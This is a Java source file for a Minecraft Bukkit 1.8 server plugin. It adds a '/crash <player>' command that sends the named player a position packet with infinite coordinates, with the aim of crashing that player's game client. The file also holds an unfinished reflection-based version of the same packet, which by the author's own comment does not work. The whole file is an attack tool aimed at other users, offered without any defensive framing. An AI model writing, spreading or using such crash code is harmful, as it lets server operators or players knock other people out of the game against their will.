package me.pp021.crashplayer;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import com.google.common.collect.Sets;

import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition.EnumPlayerTeleportFlags;

public class Crash implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String lable, String[] args) {
		if (args.length == 0) {
			sender.sendMessage("/crash <player>");
			return true;
		}
		Player target = Bukkit.getPlayer(args[0]);
		if (target == null) {
			sender.sendMessage("there is no player name " + args[0]);
			return true;
		}
		PacketPlayOutPosition packet = new PacketPlayOutPosition(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, Sets.newHashSet(Arrays.asList(EnumPlayerTeleportFlags.X, EnumPlayerTeleportFlags.Y, EnumPlayerTeleportFlags.X_ROT, EnumPlayerTeleportFlags.Y_ROT, EnumPlayerTeleportFlags.Z)));
		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		sender.sendMessage("sent crash packet");
		return true;
	}

	/**
	 * im trying to use the java reflection but idk how to get enum you can remove it
	 * 
	 */

	private void sendPacket(Player player, Object packet) {
		try {
			Object handle = player.getClass().getMethod("getHandle").invoke(player);
			Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
			playerConnection.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(playerConnection, packet);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private Class<?> getNMSClass(String name) {
		try {
			return Class.forName("net.minecraft.server."
					+ Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3] + "." + name);
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
		return null;
	}

	private Object getCrashPacket() {
		try {
			Class<?> PacketPlayOutPosition = getNMSClass("PacketPlayOutPosition");
			Class<?> PacketPlayOutPositionEnum = getNMSClass("PacketPlayOutPosition$EnumPlayerTeleportFlags");
			Set<?> a = Sets.newHashSet(getEnumValues(PacketPlayOutPositionEnum));
			if (a == null)
				return null;
			Object packet = PacketPlayOutPosition.getConstructor(
					new Class<?>[] { double.class, double.class, double.class, float.class, float.class, Set.class })
					.newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, a);
			return packet;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	// https://www.logicbig.com/how-to/code-snippets/jcode-reflection-values-field-in-enum.html
	@SuppressWarnings({ "rawtypes", "unchecked" })
	private static <E extends Enum> E[] getEnumValues(Class<?> enumClass) {
		Object o = null;
		try {
			// Field f = enumClass.getDeclaredField("$VALUES");
			Field f = enumClass.getDeclaredField("getDefaultValue");
			f.setAccessible(true);
			o = f.get(null);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return (E[]) o;
	}

}
